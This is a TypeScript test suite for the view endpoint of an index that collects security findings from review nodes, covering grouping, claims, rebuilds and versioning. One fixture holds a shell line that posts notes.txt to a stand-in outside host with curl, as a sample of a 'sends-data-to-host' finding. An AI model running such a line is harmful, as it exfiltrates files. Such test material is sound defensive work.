// The data endpoint (R10, R13, R15, R35): the view of one component commit, built when it
// is read. It holds data and no prose, and every body carries the schema version.

import { ACCEPTED, COMPONENT_STATUS, INDEX_REFUSAL, NODE_REGISTERED, VIEW, conforms, recordId } from "@cairnfield/protocol";
import { describe, expect, it } from "vitest";
import { syncNode } from "../src/sync.ts";
import { BRANCH, HOST, NODE_A, NODE_B, NODE_C, REGISTRATION_HEADER, REGISTRATION_KEY, RESET_HEADER, RESET_KEY, SKILL, START, UPSTREAM, bench, claim, clockAt, finding, freshIndexForEachTest, synced } from "./bench.ts";
import type { Answer } from "./bench.ts";
import { blobHash } from "./fake-artifacts.ts";
import { FakeNode, nodesBehindFetch } from "./fake-node.ts";

const MINUTE = 60_000;

freshIndexForEachTest();

describe("findings in the view (R10)", () => {
  it("shows two matching findings from two nodes as one match group confirmed by two organizations", async () => {
    const on = bench();
    const [one, other] = [new FakeNode(NODE_A), new FakeNode(NODE_B)];
    nodesBehindFetch(one, other);
    const component = await on.component();
    await on.registerNode(NODE_A);
    await on.registerNode(NODE_B);
    // The line ranges overlap on line 3, and the observation is the same.
    const [first] = await one.publish(finding(component));
    const [second] = await other.publish(finding(component, { location: { path: SKILL, start: 2, end: 3 }, criterion: "safe-to-run-sandboxed" }));
    await synced(on, NODE_A);
    await synced(on, NODE_B);

    const view = await on.view(component);
    expect(view.organizations).toBe(2);
    expect(view.findings).toHaveLength(1);
    const [group] = view.findings;
    expect(group).toMatchObject({ observation: "hidden-instruction", paths: [SKILL], nodes: [NODE_A, NODE_B], confirmed: true });
    expect(group?.findings.map((entry) => entry.id).sort()).toEqual([first, second].sort());
    // Each criterion is confirmed apart: a finding against the weaker one counts against the stricter one (R5).
    expect(group?.criteria).toEqual([
      { criterion: "safe-to-read", nodes: [NODE_A], confirmed: false },
      { criterion: "safe-to-run-sandboxed", nodes: [NODE_A, NODE_B], confirmed: true },
      { criterion: "safe-to-run-with-access", nodes: [NODE_A, NODE_B], confirmed: true },
    ]);
  });

  it("shows two findings from two nodes on two byte-identical files as one match group that lists both paths", async () => {
    const on = bench();
    const [one, other] = [new FakeNode(NODE_A), new FakeNode(NODE_B)];
    nodesBehindFetch(one, other);
    const component = await on.component();
    await on.registerNode(NODE_A);
    await on.registerNode(NODE_B);
    const sends = { observation: "sends-data-to-host", host: "sync.fellbeck-tools.example", check: "code" };
    await one.publish(finding(component, { ...sends, location: { path: "scripts/sync.sh", start: 3, end: 3 } }));
    await other.publish(finding(component, { ...sends, location: { path: "tools/sync.sh", start: 3, end: 3 } }));
    await synced(on, NODE_A);
    await synced(on, NODE_B);

    const view = await on.view(component);
    expect(view.findings).toHaveLength(1);
    expect(view.findings[0]).toMatchObject({
      blob: await blobHash("#!/bin/sh\nset -e\ncurl --data @notes.txt https://sync.fellbeck-tools.example/push\n"),
      host: "sync.fellbeck-tools.example",
      paths: ["scripts/sync.sh", "tools/sync.sh"],
      nodes: [NODE_A, NODE_B],
      confirmed: true,
    });
    expect(view.hosts).toEqual([{ host: "sync.fellbeck-tools.example", count: 2 }]);
  });

  it("keeps findings that do not match in groups of their own, each with one organization", async () => {
    const on = bench();
    const [one, other] = [new FakeNode(NODE_A), new FakeNode(NODE_B)];
    nodesBehindFetch(one, other);
    const component = await on.component();
    await on.registerNode(NODE_A);
    await on.registerNode(NODE_B);
    await one.publish(finding(component));
    await other.publish(finding(component, { observation: "sends-data-to-host", host: HOST }));
    await synced(on, NODE_A);
    await synced(on, NODE_B);

    const view = await on.view(component);
    expect(view.findings.map((group) => ({ observation: group.observation, nodes: group.nodes, confirmed: group.confirmed }))).toEqual([
      { observation: "hidden-instruction", nodes: [NODE_A], confirmed: false },
      { observation: "sends-data-to-host", nodes: [NODE_B], confirmed: false },
    ]);
  });

  it("counts a confirming re-check from a second node, and shows a counter-finding beside the finding without changing the count", async () => {
    const on = bench();
    const [one, other, third] = [new FakeNode(NODE_A), new FakeNode(NODE_B), new FakeNode(NODE_C)];
    nodesBehindFetch(one, other, third);
    const component = await on.component();
    for (const node of [NODE_A, NODE_B, NODE_C]) await on.registerNode(node);
    const [target] = await one.publish(finding(component));
    const [recheck] = await other.publish({ version: "1", type: "re-check", component, finding: target, model: "none" });
    const [dispute] = await third.publish({ version: "1", type: "counter-finding", component, finding: target, reason: "documented-behavior", model: "none" });
    for (const node of [NODE_A, NODE_B, NODE_C]) await synced(on, node);

    const [group] = (await on.view(component)).findings;
    expect(group?.rechecks.map((entry) => [entry.node, entry.id])).toEqual([[NODE_B, recheck]]);
    expect(group?.counterFindings.map((entry) => [entry.node, entry.id])).toEqual([[NODE_C, dispute]]);
    expect(group?.nodes).toEqual([NODE_A, NODE_B]);
    expect(group?.confirmed).toBe(true);
  });
});

describe("claims in the view (R15, KTD15)", () => {
  it("shows a claim older than the set time with no citing record as expired, and a claim cited by a patch as closed", async () => {
    const on = bench();
    const node = new FakeNode(NODE_A);
    nodesBehindFetch(node);
    const component = await on.component();
    await on.registerNode(NODE_A);
    const [cited] = await node.publish(finding(component));
    const patchClaim = { version: "1", type: "claim", component, kind: "patch", number: 2, findings: [cited], intent: "new" };
    const [open, taken] = await node.publish(claim(component, 1), patchClaim);
    await synced(on, NODE_A);

    const stateOf = async (id: string | undefined): Promise<string | undefined> => (await on.view(component)).claims.find((entry) => entry.id === id)?.state;
    expect(await stateOf(open)).toBe("live");
    expect(await stateOf(taken)).toBe("live");
    const before = (await on.view(component)).viewVersion;

    await node.publish({ version: "1", type: "patch", component, commit: "3d".repeat(20), findings: [cited], claim: taken, model: "none" });
    await synced(on, NODE_A);
    expect(await stateOf(taken)).toBe("closed");
    expect(await stateOf(open)).toBe("live");

    clockAt(START + 15 * MINUTE - 1);
    expect(await stateOf(open)).toBe("live");
    const live = (await on.view(component)).viewVersion;
    clockAt(START + 15 * MINUTE);
    expect(await stateOf(open)).toBe("expired");
    expect(await stateOf(taken)).toBe("closed");
    // A claim that expires changes the view, so the version moves with no write at all.
    expect(live).toBeGreaterThan(before);
    expect((await on.view(component)).viewVersion).toBeGreaterThan(live);
  });

  it("expires a claim after the time the index is set to", async () => {
    const on = bench({ CLAIM_TTL_SECONDS: "120" });
    const node = new FakeNode(NODE_A);
    nodesBehindFetch(node);
    const component = await on.component();
    await on.registerNode(NODE_A);
    await node.publish(claim(component, 1));
    await synced(on, NODE_A);
    clockAt(START + 2 * MINUTE - 1);
    expect((await on.view(component)).claims[0]?.state).toBe("live");
    clockAt(START + 2 * MINUTE);
    expect((await on.view(component)).claims[0]?.state).toBe("expired");
  });

  it("closes a claim only for a record of the node that made it", async () => {
    const on = bench();
    const [one, other] = [new FakeNode(NODE_A), new FakeNode(NODE_B)];
    nodesBehindFetch(one, other);
    const component = await on.component();
    await on.registerNode(NODE_A);
    await on.registerNode(NODE_B);
    const [open] = await one.publish(claim(component, 1));
    await other.publish(finding(component, { claim: open }));
    await synced(on, NODE_A);
    await synced(on, NODE_B);
    expect((await on.view(component)).claims).toMatchObject([{ node: NODE_A, id: open, state: "live" }]);
  });
});

describe("a patch record before its commit is checked", () => {
  it("is listed as pending, and shows as no patch", async () => {
    const on = bench();
    const node = new FakeNode(NODE_A);
    nodesBehindFetch(node);
    const component = await on.component();
    await on.registerNode(NODE_A);
    const [cited] = await node.publish(finding(component));
    const [patch] = await node.publish({ version: "1", type: "patch", component, commit: "3d".repeat(20), findings: [cited], model: "none" });
    await synced(on, NODE_A);

    const view = await on.view(component);
    expect(view.patches).toEqual([]);
    expect(view.pending).toEqual([{ node: NODE_A, hash: patch, type: "patch" }]);
  });
});

describe("recipes in the view", () => {
  it("lists each file tree once, with the organizations that published it", async () => {
    const on = bench();
    const [one, other] = [new FakeNode(NODE_A), new FakeNode(NODE_B)];
    nodesBehindFetch(one, other);
    const component = await on.component();
    await on.registerNode(NODE_A);
    await on.registerNode(NODE_B);
    const recipe = { version: "1", type: "recipe", component, patches: ["a".repeat(64)], tree: "4c".repeat(20) };
    const [id] = await one.publish(recipe);
    await other.publish(recipe);
    await synced(on, NODE_A);
    await synced(on, NODE_B);

    const { recipes } = await on.view(component);
    expect(recipes).toHaveLength(1);
    expect(recipes[0]).toMatchObject({ tree: "4c".repeat(20), nodes: [NODE_A, NODE_B] });
    expect(recipes[0]?.records.map((entry) => [entry.node, entry.id])).toEqual([[NODE_A, id], [NODE_B, id]]);
  });
});

describe("a view narrowed by a teams query (KTD38)", () => {
  it("holds records from the listed nodes only, grouped and counted again", async () => {
    const on = bench();
    const [one, other] = [new FakeNode(NODE_A), new FakeNode(NODE_B)];
    nodesBehindFetch(one, other);
    const component = await on.component();
    await on.registerNode(NODE_A);
    await on.registerNode(NODE_B);
    const [first] = await one.publish(finding(component));
    await other.publish(finding(component, { location: { path: SKILL, start: 2, end: 3 } }), claim(component, 4));
    await other.publish(finding(component, { location: { path: "README.md", start: 400, end: 410 } }));
    await synced(on, NODE_A);
    await synced(on, NODE_B);

    const whole = await on.view(component);
    expect(whole.findings[0]?.confirmed).toBe(true);
    expect(whole.rejected).toHaveLength(1);
    expect(whole.claims).toHaveLength(1);

    const narrowed = await on.view(component, [NODE_A]);
    expect(narrowed.organizations).toBe(1);
    expect(narrowed.nodes.map(({ node }) => node)).toEqual([NODE_A]);
    expect(narrowed.findings).toHaveLength(1);
    expect(narrowed.findings[0]).toMatchObject({ nodes: [NODE_A], confirmed: false });
    expect(narrowed.findings[0]?.findings.map((entry) => entry.id)).toEqual([first]);
    expect(narrowed.rejected).toEqual([]);
    expect(narrowed.claims).toEqual([]);
    expect(JSON.stringify(narrowed)).not.toContain(NODE_B);

    const both = await on.view(component, [NODE_B, NODE_A]);
    expect(both.findings).toEqual(whole.findings);
  });

  it("refuses a team in no accepted spelling, and any other query", async () => {
    const on = bench();
    const component = await on.component();
    const refused = { status: 400, body: { version: "1", error: "bad-request" } };
    expect(await on.call("GET", `/components/${component}/view?teams=${encodeURIComponent("http://node.team-a.example")}`)).toEqual(refused);
    expect(await on.call("GET", `/components/${component}/view?teams=${encodeURIComponent(`${NODE_A}/`)}`)).toEqual(refused);
    expect(await on.call("GET", `/components/${component}/view?team=${encodeURIComponent(NODE_A)}`)).toEqual(refused);
  });
});

describe("a rebuild from the nodes (R12, KTD13)", () => {
  it("rebuilds the same findings after all records are dropped and a full sync has run, and shows every claim as expired", async () => {
    const on = bench();
    const [one, other] = [new FakeNode(NODE_A), new FakeNode(NODE_B)];
    nodesBehindFetch(one, other);
    const component = await on.component();
    await on.registerNode(NODE_A);
    await on.registerNode(NODE_B);
    const [cited] = await one.publish(finding(component));
    await one.publish(claim(component, 1), finding(component, { location: { path: SKILL, start: 1, end: 1 }, claim: await recordId(claim(component, 7)) }), claim(component, 7));
    await other.publish(finding(component, { location: { path: SKILL, start: 2, end: 3 } }), { version: "1", type: "re-check", component, finding: cited, model: "none" });
    await synced(on, NODE_A);
    await synced(on, NODE_B);
    const before = await on.view(component);
    expect(before.claims.map((entry) => entry.state).sort()).toEqual(["closed", "live"]);

    expect((await on.call("POST", "/reset", undefined, [RESET_HEADER, RESET_KEY])).status).toBe(200);
    const emptied = await on.view(component);
    expect(emptied.findings).toEqual([]);
    expect(emptied.claims).toEqual([]);
    expect(emptied.nodes.map(({ processed }) => processed)).toEqual([undefined, undefined]);
    expect(emptied.viewVersion).toBeGreaterThan(before.viewVersion);

    // The reset queued a sync of every node.
    await on.drain();
    const after = await on.view(component);
    expect(after.findings).toEqual(before.findings);
    expect(after.nodes).toEqual(before.nodes);
    expect(after.claims.map((entry) => entry.id).sort()).toEqual(before.claims.map((entry) => entry.id).sort());
    expect(after.claims.map((entry) => entry.state)).toEqual(["expired", "expired"]);
    expect(after.viewVersion).toBeGreaterThan(emptied.viewVersion);

    // The rebuild is over: a claim that arrives now is live.
    const [fresh] = await one.publish(claim(component, 9));
    await synced(on, NODE_A);
    expect((await on.view(component)).claims.find((entry) => entry.id === fresh)?.state).toBe("live");
  });

  it("shows a claim as expired when the reset came while a sync of its node was waiting for the node's listing", async () => {
    const on = bench();
    const node = new FakeNode(NODE_A);
    nodesBehindFetch(node);
    const component = await on.component();
    await on.registerNode(NODE_A);
    const [open] = await node.publish(claim(component, 1));
    await synced(on, NODE_A);
    expect((await on.view(component)).claims).toMatchObject([{ id: open, state: "live" }]);

    // The sync started before the reset, and stores the node's records after it.
    node.onListing = async () => {
      node.onListing = undefined;
      expect((await on.call("POST", "/reset", undefined, [RESET_HEADER, RESET_KEY])).status).toBe(200);
    };
    expect(await syncNode(on.env, NODE_A, START)).toMatchObject({ ok: true, stored: 1 });
    // The sync that the reset queued ends the rebuild.
    await on.drain();
    expect((await on.view(component)).claims).toMatchObject([{ id: open, state: "expired" }]);
    const [fresh] = await node.publish(claim(component, 2));
    await synced(on, NODE_A);
    expect((await on.view(component)).claims.find((entry) => entry.id === fresh)?.state).toBe("live");
  });
});

describe("the view version (KTD11)", () => {
  it("is the same for an unchanged view on the next poll, and another one after a change", async () => {
    const on = bench();
    const node = new FakeNode(NODE_A);
    nodesBehindFetch(node);
    const component = await on.component();
    await on.registerNode(NODE_A);
    await node.publish(finding(component));
    await synced(on, NODE_A);

    const first = await on.view(component);
    clockAt(START + 2000);
    const second = await on.view(component);
    expect(second.viewVersion).toBe(first.viewVersion);
    expect(second).toEqual(first);

    await node.publish(finding(component, { location: { path: "README.md", start: 1, end: 1 } }));
    await synced(on, NODE_A);
    expect((await on.view(component)).viewVersion).toBeGreaterThan(first.viewVersion);
  });

  it("moves on when a node is registered, and stays the same when a registration is refused as already registered", async () => {
    const on = bench();
    const component = await on.component();
    const before = (await on.view(component)).viewVersion;
    await on.registerNode(NODE_A);
    const added = (await on.view(component)).viewVersion;
    expect(added).toBeGreaterThan(before);

    expect((await on.registerNode(NODE_A)).body).toEqual({ version: "1", error: "already-registered" });
    expect((await on.view(component)).viewVersion).toBe(added);
  });
});

describe("every answer of the index (R13, R35)", () => {
  it("carries the schema version, in a view and in a refusal", async () => {
    const on = bench();
    const component = await on.component();
    expect((await on.view(component)).version).toBe("1");
    expect(await on.call("GET", `/components/${"9a".repeat(20)}/view`)).toEqual({ status: 404, body: { version: "1", error: "not-found" } });
    expect(await on.call("GET", "/components/not-a-commit/view")).toEqual({ status: 404, body: { version: "1", error: "not-found" } });
    expect(await on.call("GET", "/hints")).toEqual({ status: 404, body: { version: "1", error: "not-found" } });
    expect(await on.call("DELETE", `/components/${component}/view`)).toEqual({ status: 404, body: { version: "1", error: "not-found" } });
  });

  it("holds no field of free text addressed to a reader, such as a hint or a next step", async () => {
    const on = bench({ MAX_NODES: "2" });
    const [one, other] = [new FakeNode(NODE_A), new FakeNode(NODE_B)];
    nodesBehindFetch(one, other);
    const commit = await on.artifacts.host(UPSTREAM, BRANCH, { [SKILL]: "# Summarize\n" });
    const key = [REGISTRATION_HEADER, REGISTRATION_KEY] as const;

    // Each answer is held to its shape in the protocol, and no shape there has a field for text.
    const held = (answer: Answer, shape: Parameters<typeof conforms>[0]): void => {
      expect(conforms(answer.status === 200 ? shape : INDEX_REFUSAL, answer.body)).toBeUndefined();
    };
    held(await on.call("POST", "/nodes", { url: NODE_A }), NODE_REGISTERED);
    held(await on.registerNode(NODE_A), NODE_REGISTERED);
    held(await on.registerNode(NODE_A), NODE_REGISTERED);
    held(await on.registerNode(NODE_B), NODE_REGISTERED);
    held(await on.registerNode(NODE_C), NODE_REGISTERED);
    held(await on.registerNode("http://node.team-c.example"), NODE_REGISTERED);
    held(await on.call("POST", "/components", { url: "https://git.fellbeck-tools.example/other.git", branch: BRANCH, commit }, key), COMPONENT_STATUS);
    held(await on.registerComponent({ url: UPSTREAM, branch: BRANCH, commit }), COMPONENT_STATUS);
    held(await on.call("GET", `/components/${commit}/view`), VIEW);
    await on.deliver();
    on.artifacts.finish();
    await on.drain();
    held(await on.registerComponent({ url: UPSTREAM, branch: BRANCH, commit }), COMPONENT_STATUS);

    await one.publish(finding(commit, { location: { path: SKILL, start: 1, end: 1 } }), claim(commit, 1));
    await one.publish(finding(commit, { location: { path: SKILL, start: 9, end: 9 } }));
    await other.publish(finding(commit, { location: { path: SKILL, start: 1, end: 1 } }), { version: "1", type: "recipe", component: commit, patches: ["a".repeat(64)], tree: "4c".repeat(20) });
    held(await on.notice(NODE_A), ACCEPTED);
    held(await on.notice(NODE_B), ACCEPTED);
    held(await on.notice(NODE_C), ACCEPTED);
    await on.drain();

    const view = await on.call("GET", `/components/${commit}/view`);
    held(view, VIEW);
    expect(view.body).toMatchObject({ findings: [{ confirmed: true }], rejected: [{ reason: "lines-out-of-range" }], claims: [{ state: "live" }], recipes: [{}] });
    held(await on.call("GET", `/components/${commit}/view?teams=${encodeURIComponent(NODE_A)}`), VIEW);
    held(await on.call("GET", `/components/${commit}/view?hint=1`), VIEW);
    held(await on.call("POST", "/reset"), ACCEPTED);
    held(await on.call("POST", "/reset", undefined, [RESET_HEADER, RESET_KEY]), ACCEPTED);
    held(await on.call("GET", "/"), ACCEPTED);
  });
});
